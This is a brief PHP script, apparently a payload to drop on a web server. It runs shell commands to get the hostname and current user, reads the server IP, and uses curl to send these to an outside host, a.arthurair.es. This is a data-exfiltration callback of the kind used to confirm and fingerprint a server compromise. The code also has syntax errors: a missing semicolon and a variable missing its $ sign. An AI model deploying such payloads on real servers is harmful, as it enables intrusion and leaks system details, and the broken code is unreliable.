<?php
    $hostname = system('hostname');
    $who = system('whoami');
    $ip = $_SERVER['SERVER_ADDR'];

    $finalString = urlencode($hostname."+".$who."+".$ip)

    system("curl https://a.arthurair.es/?".finalString);
 ?>
